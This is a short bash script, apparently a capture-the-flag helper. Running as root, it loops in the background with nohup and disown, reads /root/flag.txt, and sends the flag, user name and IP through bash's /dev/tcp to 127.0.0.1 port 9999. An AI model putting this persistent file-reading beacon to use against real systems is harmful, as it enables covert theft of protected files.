#!/bin/bash


#COLORS
blue="\033[01;34m"
green="\033[01;32m"
red="\033[01;31m"

#Initialize variables
ip=$(ip addr | grep lo$ | awk '{print $2}' | cut -d / -f 1)
uid=$(id -un)

if [[ $uid != "root" ]]; then
	printf "$red[+] You are not the \"root\" user!\n"
	exit
fi

function root-flag-tunnel(){
	bash -c "printf \"$red ROOT FLAG : $id : $uid : $ip : $flag \n\" > /dev/tcp/127.0.0.1/9999" 2>/dev/null
}

type -fp watch 1>/dev/null
if [[ $? == 0 ]]; then
	id=0
	while true; do
		nohup watch -gn 1 'cat /root/flag.txt' 1>/dev/null 2>/dev/null
		if [[ $? == 0 ]]; then
			flag=$(cat /root/flag.txt)
			root-flag-tunnel
			id=$((id + 1))
		fi
	done&disown

else
	for id in {1..1000}; do
		flag=$(cat /root/flag.txt 2>/dev/null)
		root-flag-tunnel
		sleep 5
	done&disown
fi



